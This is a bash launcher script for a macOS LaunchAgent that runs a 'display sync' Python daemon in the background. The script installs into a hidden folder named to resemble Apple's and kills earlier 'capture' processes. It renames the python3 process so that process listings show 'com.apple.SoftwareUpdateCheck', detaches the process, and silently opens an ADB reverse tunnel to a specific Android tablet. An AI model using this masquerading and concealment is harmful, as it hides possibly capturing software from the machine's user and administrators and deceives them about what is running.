#!/usr/bin/env bash
# com.institute.backgroundsyncd launcher
# Called by LaunchAgent. Runs display sync daemon with no visible terminal.

INSTALL_DIR="$HOME/Library/.AppleDiagnostics"
PID_FILE="$INSTALL_DIR/update.pid"
LOG_FILE="$INSTALL_DIR/update.log"
DAEMON="$INSTALL_DIR/com.institute.backgroundsyncd"

# Kill stale capture processes from previous sessions
pkill -9 -f "com.institute.helperd" 2>/dev/null || true
sleep 0.3

# Guard: already running?
if [[ -f "$PID_FILE" ]]; then
    EXISTING=$(cat "$PID_FILE" 2>/dev/null || echo "")
    STATE=$(ps -o state= -p "$EXISTING" 2>/dev/null | tr -d ' ' || echo "")
    if [[ -n "$STATE" ]] && [[ "$STATE" != "Z" ]]; then
        exit 0
    fi
    rm -f "$PID_FILE"
fi

# Rotate log (keep last 200 lines)
[[ -f "$LOG_FILE" ]] && tail -200 "$LOG_FILE" > "$LOG_FILE.tmp" && \
    mv "$LOG_FILE.tmp" "$LOG_FILE" 2>/dev/null || true

# Launch with exec -a rename so ps shows com.apple.SoftwareUpdateCheck, not python3
# The exec replaces the shell with python3, inheriting the given process name
nohup bash -c "exec -a 'com.apple.SoftwareUpdateCheck' /usr/bin/python3 '$DAEMON'" \
    >> "$LOG_FILE" 2>&1 &
BGPID=$!
disown $BGPID 2>/dev/null || true

# Set up ADB reverse tunnel silently if tablet connected
/usr/local/share/android-commandlinetools/platform-tools/adb \
    -s R52X708VMWW reverse tcp:9090 tcp:9090 >/dev/null 2>&1 || true
